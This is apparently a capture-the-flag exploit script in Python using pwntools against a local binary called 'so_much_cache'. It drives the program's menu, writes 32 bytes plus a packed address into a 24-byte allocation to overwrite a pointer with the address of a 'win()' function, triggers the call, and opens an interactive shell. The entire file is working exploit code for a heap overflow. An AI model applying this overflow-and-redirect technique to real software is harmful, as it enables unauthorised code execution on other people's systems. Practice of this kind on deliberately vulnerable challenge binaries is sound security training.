#!/usr/bin/python3
from pwn import process, p64

shell = process("./so_much_cache")

def malloc(size, data):
    shell.sendlineafter(b": ", b"1")
    shell.sendlineafter(b": ", str(size).encode())
    shell.sendlineafter(b": ", data)

def prepare():
    shell.sendlineafter(b": ", b"4")

def jump(option):
    shell.sendlineafter(b": ", b"5")
    shell.sendlineafter(b"\n", str(option).encode())

malloc(24, b"A" * 32 + p64(0x4009ae)) # win()

prepare()
jump(1)

shell.interactive()
